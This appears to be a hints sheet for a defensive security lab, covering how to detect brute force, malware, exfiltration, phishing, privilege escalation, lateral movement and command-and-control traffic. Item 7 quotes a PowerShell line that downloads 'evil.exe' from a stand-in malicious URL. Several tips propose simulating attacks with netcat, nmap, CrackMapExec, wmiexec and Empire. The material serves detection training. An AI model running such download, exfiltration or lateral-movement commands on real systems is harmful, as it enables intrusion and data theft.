#HINTS
1. Brute Force Detection

Hint:
Look into authentication logs like /var/log/auth.log or Windows Event ID 4625. Focus on patterns where
multiple failed attempts are made from the same IP in a short time.

Tip: Think of Hydra or Burp Suite brute force modules.

2. Malware Detection

Hint:
Use VirusTotal or any.run to analyze suspicious files. In your SIEM, observe unexpected processes, registry
changes, or connections to unknown IPs.

Tip: Try simulating a malware dropper script with curl or Invoke-WebRequest and execute in a lab.

3. Data Exfiltration Detection

Hint:
Watch for large outbound traffic on non-standard ports. Analyze network logs, and use Wireshark to capture
exfiltration attempts.

Tip: Use netcat to simulate file transfer over HTTP, FTP, or DNS

4. Suspicious Network Activity

Hint:
Use tools like Wireshark or tcpdump to monitor abnormal traffic patterns. Look for port scanning, repeated
connection attempts, or odd DNS queries.

Tip: Try nmap -sS and watch how it shows up in logs.

5. Phishing Email Detection

Hint:
Look for email headers, links to shortened or weird domains, and attachments with .exe, .js, or
.vbs extensions. Use email gateways or SIEM to flag these.

Tip: Use the open-source tool “GoPhish” to simulate phishing in your lab.

6. Unauthorized Access Attempt

Hint:
Audit logs are your best friend. Search for login attempts outside office hours, use of disabled accounts, or
access from unusual geolocations.

Tip: Use failed logon Event ID 4625 and success 4624 to compare patterns.

7. Suspicious File Download

Hint:
Use PowerShell logging (ModuleLogging, ScriptBlockLogging) to catch scripts like:
Invoke-WebRequest -Uri "http://malicious-url" -OutFile "evil.exe"

Tip: Enable Sysmon to detect ProcessCreate + network connections.

8. Privilege Escalation Attempt

Hint:
Check for creation of new admin users, or modifications to registry keys, services, or token
impersonation attempts.

Tip: Tools like whoami /priv, accesschk, and winPEAS reveal escalation paths.

9. Lateral Movement Detection

Hint:
Monitor SMB, WMI, RDP, or PsExec traffic between internal systems. Use Sysmon Event ID
3 and Windows Event ID 4624 to trace logons.

Tip: Try moving laterally using CrackMapExec or wmiexec from Impacket.

10. Command and Control (C2) Traffic Detection

Hint:
Detect beaconing patterns, especially regular intervals of outbound traffic. Look into PowerShell
Empire, Cobalt Strike, or DNS-based C2.

Tip: Set up a mock listener using Netcat or Empire and track outbound packets.
